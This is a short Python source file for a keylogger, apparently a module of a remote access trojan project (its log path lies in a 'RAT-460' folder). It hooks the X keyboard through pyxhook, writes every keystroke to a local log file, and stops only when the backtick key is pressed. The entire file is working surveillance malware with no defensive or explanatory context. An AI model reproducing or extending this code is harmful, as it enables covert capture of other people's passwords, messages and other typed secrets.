import pyxhook

log_file='/home/ubuntu/RAT-460/logs/keylogger/log.txt'

#this function is called everytime a key is pressed.
def OnKeyPress(event):
    fob=open(log_file,'a')
    fob.write(event.Key)
    fob.write('\n')

    if event.Ascii==96: #special character to exit
        fob.close()
        new_hook.cancel()

new_hook=pyxhook.HookManager()

new_hook.KeyDown=OnKeyPress

new_hook.HookKeyboard()

new_hook.start()